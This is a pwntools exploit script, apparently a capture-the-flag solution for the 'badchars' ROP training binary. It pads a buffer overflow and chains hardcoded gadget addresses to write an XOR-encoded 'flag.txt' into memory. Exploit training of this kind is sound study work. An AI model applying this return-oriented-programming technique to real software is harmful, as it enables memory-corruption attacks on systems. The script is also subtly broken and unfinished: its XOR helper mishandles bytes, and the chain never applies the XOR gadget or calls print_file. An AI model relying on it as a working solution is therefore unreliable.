#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
exe = './badchars'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def xor_string(string, key):
    xor_indxs =[]
    output = ""
    for indx, char in enumerate(string):
        if char in badchars:
            nchar = chr(ord(char) ^ key)
            output += nchar
            xor_indxs.append(indx)
            continue
        output += char
    return bytes(output.encode('latin')), xor_indxs

ret                     = p64(0x00000000004004ee)
xor_r15_r14b            = p64(0x0000000000400628)
pop_rdi                 = p64(0x00000000004006a3)
pop_r12_r13_r14_r15_ret = p64(0x000000000040069c)
mov_r13_r12_ret         = p64(0x0000000000400634)
print_file              = p64(0x0000000000400510)
write_to                = p64(0x0000000000601038)
badchars                = ['x', 'g', 'a', '.']
xor_key                 = 2
flag_string             = b'flag.txt'

xoredstr, xor_offsets = xor_string(flag_string, xor_key)

payload = b'A'*40 \
        + pop_r12_r13_r14_r15_ret \
        + xoredstr \
        + write_to \
        + mov_r13_r12_ret \
        + p64(0xdeadbeefdeadbeef) \
        + p64(0xdeadbeefdeadbeef)

io.sendline(payload)

io.interactive()

